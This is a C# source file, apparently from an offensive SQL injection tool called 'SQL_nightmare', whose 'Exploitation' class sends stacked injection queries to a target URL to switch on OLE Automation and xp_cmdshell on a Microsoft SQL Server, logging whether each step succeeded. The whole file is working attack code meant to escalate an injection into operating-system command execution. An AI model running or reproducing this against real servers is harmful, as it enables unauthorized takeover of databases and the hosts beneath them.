using System;
using System.Collections.Generic;
using System.Text;

namespace SQL_nightmare
{
    class Exploitation
    {
        public static void initialize(string url)
        {
            enableOLEAutomation(url);
            enableXPCMDShell(url);
        }

        public static bool enableOLEAutomation(string url)
        {
            string OLEAutomationEnablingQuery = QueryCrafter.constructStackedQuery(url, QueriesDB.EnableOLEAutomation);
            OLEAutomationEnablingQuery = OLEAutomationEnablingQuery.Replace("'rummykhan'", QueriesDB.Replacement);

            if (ResponseFilter.confirmResponce(OLEAutomationEnablingQuery, QueriesDB.Replacement))
            {
                Log.logOutput("OLE Automation Enabled..");
                return true;
            }
            Log.logError("Failed to Enable OLE Automation Procedures..");
            return false;
        }

        public static bool enableXPCMDShell(string url)
        {
            string XPCMDShellEnablingQuery = QueryCrafter.constructStackedQuery(url, QueriesDB.EnableXPCMDShell);
            XPCMDShellEnablingQuery = XPCMDShellEnablingQuery.Replace("'rummykhan'", QueriesDB.Replacement);

            if (ResponseFilter.confirmResponce(XPCMDShellEnablingQuery, QueriesDB.Replacement))
            {
                Log.logOutput("XP CMD Shell Enabled..");
                return true;
            }
            Log.logError("Failed to Enable XP CMD Shell..");
            return false;
        }
    }
}
